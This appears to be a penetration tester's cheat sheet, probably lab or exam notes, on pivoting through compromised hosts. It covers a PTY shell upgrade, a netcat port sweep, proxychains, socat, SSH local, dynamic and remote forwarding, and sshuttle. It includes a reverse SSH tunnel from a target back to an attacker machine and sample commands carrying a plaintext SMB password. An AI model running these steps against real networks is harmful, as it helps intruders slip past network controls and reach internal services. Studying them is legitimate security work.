## Tunneling Theory + SOCKS:

Port forwarding may need tty capabilities on target machine, so import with python:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Enumerate hosts to tunnel to without nmap:
```
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
```

Confirm the tunnel is working from another shell by listing listening ports:
```
ss -ntplu
```

Force packets over SOCKS with Proxychains:
```
#Edit /etc/proxychains4.conf to add the socket to the end:
socks5 <ip> <port>

#Prepend "proxychains -q -f <conf-file>" to the command to run, such as:
proxychains -q -f /etc/proxychains4.conf smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```
- -q silences any proxychains output
- Might use socks4 depending on versioning
- Won't work on statically-linked binaries
- Edit **tcp_read_time_out** and **tcp_connect_time_out** values in the conf-file for faster connections.

## Socat port forwarding:
```
socat -ddd TCP-LISTEN:<listeningport>,fork TCP:<forkip>:<forkport>
```

------------
## SSH Local Port Forwarding:
```
ssh -v -N -L 0.0.0.0:2345:<forkip>:<forkport> <sshuser>@<passthroughip>
```

--------
## SSH Dynamic Port Forwarding:
- Allows for multiple end-sockets at wherever packets can be received
- Uses SOCKS as proxying protocol
- Only limit is that packets have to be properly formatted by SOCK-compatible client software
```
ssh -N -D 0.0.0.0:2345 <sshuser>@<passthroughip>
```

-------
## SSH Remote Port Forwarding
- Outgoing connections are often much less filtered
- If we can't control and bind to any ports on the target machine, instead we can SSH out and bind to a attacker SSH server
1. Open SSH server on attacker machine:
```
sudo systemctl start ssh
```
2. Check server is listening:
```
sudo ss -ntplu
```
3. Set up SSH tunnel back to server on target:
```
ssh -N -R 127.0.0.1:2345:10.4.203.215:5432 crabfeather@192.168.45.180
```
4. Force packets over SOCKS with Proxychains:
```
#Edit /etc/proxychains4.conf to add the socket to the end:
socks5 <ip> <port>

#Prepend "proxychains -q -f <conf-file>" to the command to run, such as:
proxychains -q -f /etc/proxychains4.conf smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```

## SSH Remote Dynamic Port Forwarding:
- Working as Remote PF with functionality of dynamic tunneling
- Available since OpenSSH 7.6 in Oct 2017 -- required client's version
- Works with -R flag but with only one socket, and only needing port which defaults to loopback address
1. Open SSH server on attacker machine:
```
sudo systemctl start ssh
```
2. Set up SSH tunnel back to server on target:
```
ssh -N -R 2345 crabfeather@192.168.45.180
```
3. Win!

------
## SSHuttle:
- Turns a SSH connection into something similar to a VPN
- Requires root privs on SSH client and Python3 on SSH server
- Routes all types of traffic, including UDP and ICMP using iptables
- Also less packet loss (apparently)
```
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
```
